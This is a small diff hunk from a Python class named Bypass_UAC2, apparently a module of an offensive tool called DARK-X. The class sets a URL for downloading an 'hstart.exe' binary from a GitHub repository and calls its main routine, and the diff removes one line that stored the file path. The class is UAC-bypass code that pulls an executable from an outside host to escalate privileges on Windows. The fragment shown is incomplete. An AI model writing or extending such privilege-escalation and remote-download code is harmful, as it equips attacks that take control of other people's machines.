@@ -4,7 +4,6 @@ import tempfile
 from subprocess import Popen,PIPE
 class Bypass_UAC2():
 	def __init__(self,_):
-		self.__file__ = _.__file__
 		self.program = _.program
 		self.hstart = "https://raw.githubusercontent.com/UQABXO/DARK-X/main/bin/hstart.exe"
 		self.Main()
